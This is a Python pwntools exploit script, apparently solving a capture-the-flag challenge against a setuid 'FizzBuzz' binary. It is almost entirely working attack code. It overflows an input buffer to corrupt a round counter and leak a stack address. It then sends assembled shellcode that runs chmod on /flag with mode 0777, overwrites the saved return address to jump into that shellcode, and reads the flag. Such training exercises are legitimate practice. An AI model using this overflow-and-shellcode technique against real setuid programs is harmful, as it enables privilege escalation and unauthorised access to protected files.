import re
import sys
import pwn


pwn.context.arch = "amd64"
pwn.context.os = "linux"
pwn.context.terminal = ["tmux", "new-window"]


def tee[T: pwn.tube](process: T) -> T:
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


def struct_offsets(base: int):

    def decorator(cls):
        current_offset = base
        for field_name in vars(cls):
            if field_name.startswith("__"):
                continue
            size = getattr(cls, field_name)
            if callable(size):
                continue
            if not isinstance(size, int):
                msg = f"Field '{field_name}' must be initialized with an integer size"
                raise ValueError(msg)
            setattr(cls, field_name, current_offset)
            current_offset += size
        return cls

    return decorator


@struct_offsets(base=0x20)
class Offsets:
    """
    struct
    {
        int max_round;
        char fizz_value[16];
        char user_input[32];
        int this_round;
        char *this_answer;
        char *last_printf;
    };
    """

    max_round = 4
    fizz_value = 16
    user_input = 32
    this_round = 4
    this_answer = 8
    last_printf = 8


with tee(pwn.process(["ln", "-sf", "/flag", "f"])) as io:
    io.recvrepeat()

if "gdb" in sys.argv:
    io = pwn.gdb.debug(
        find_challenge(),
        gdbscript="""
source /opt/gef/gef.py
b *challenge+0x1a1
c
c
telescope $rsp -l 16
    """,
    )
else:
    io = pwn.process(find_challenge())

with tee(io) as io:
    critical_round = 5
    payload = bytearray(b"." * (Offsets.this_round - Offsets.user_input))
    payload += pwn.p32(-critical_round - 1, sign=1)
    io.sendafter(b":", payload)
    io.recvuntil(b"Correct answer: ")
    assert io.recvline() == b"FizzBuzz\n"

    io.sendafter(b":", payload)
    io.recvuntil(b"Correct answer: ")
    if not (match := re.search(rb"\xfa\xff\xff\xff(.{6})", io.recvline())):
        pwn.error("Failed to find address")
    user_input_24_addr = match.group(1) + b"\x00\x00"
    user_input_24_addr = pwn.u64(user_input_24_addr)
    user_input_01_addr = user_input_24_addr - 24 + 1
    pwn.success(f"Found address: {user_input_01_addr:#x}")

    shellasm = r"""
movabs rdi, 0x67616c662f
push rdi
push rsp
pop rdi    
push 0x1ff
pop rsi    
push 0x5a
pop rax    
syscall    
syscall    
"""
    shellcode = pwn.asm(shellasm)
    print(pwn.disasm(shellcode))
    shellcode_capcity = Offsets.this_round - (Offsets.user_input) - 1
    assert len(shellcode) < shellcode_capcity, (
        f"Shellcode is too large: {len(shellcode)} bytes, but only {shellcode_capcity} bytes available"
    )
    payload = [
        b"\x90",
        shellcode.ljust(shellcode_capcity, b"\x90"),
        pwn.p32(16),  # this_round
        user_input_01_addr.to_bytes(8, "little"),  # this_answer
        user_input_01_addr.to_bytes(8, "little"),  # last_printf
        user_input_01_addr.to_bytes(8, "little"),  # padding
        user_input_01_addr.to_bytes(8, "little"),  # saved rbp
        user_input_01_addr.to_bytes(8, "little"),  # return address
    ]
    payload = b"".join(payload)
    io.sendafter(b":", payload)
    io.recvrepeat()

with tee(pwn.process(["cat", "/flag"])) as io:
    io.recvrepeat()
